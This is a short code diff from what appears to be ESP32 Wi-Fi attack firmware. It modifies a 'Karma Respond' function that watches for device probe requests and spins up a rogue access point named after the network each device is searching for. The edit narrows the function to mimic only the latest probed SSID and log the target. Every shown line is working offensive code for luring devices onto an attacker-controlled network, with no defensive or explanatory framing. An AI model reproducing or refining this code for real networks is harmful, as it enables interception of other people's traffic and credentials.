@@ -58,11 +58,17 @@ void karma_hunter_stop() {
 
 // Advanced Injection (Karma Respond)
 void karma_respond_to_all() {
-    for(auto& t : detected_probes) {
-        // Logic for sending Probe Response frame 0x50
-        // (Simplified for this version - creates a matching AP)
-        WiFi.softAP(t.ssid.c_str(), "nova_secure", 1, 0);
-        delay(10);
+    if (detected_probes.empty()) return;
+    
+    // Safety: Only respond to the most recently detected probe
+    // to prevent WiFi stack crashes from rapid-fire restarts.
+    Karma_Target& t = detected_probes.back();
+    
+    static String current_mimic = "";
+    if (t.ssid != current_mimic) {
+        Serial.printf("Karma: Targeting %s\n", t.ssid.c_str());
+        WiFi.softAP(t.ssid.c_str(), "nova_secure", 1, 0); 
+        current_mimic = t.ssid;
     }
 }
 
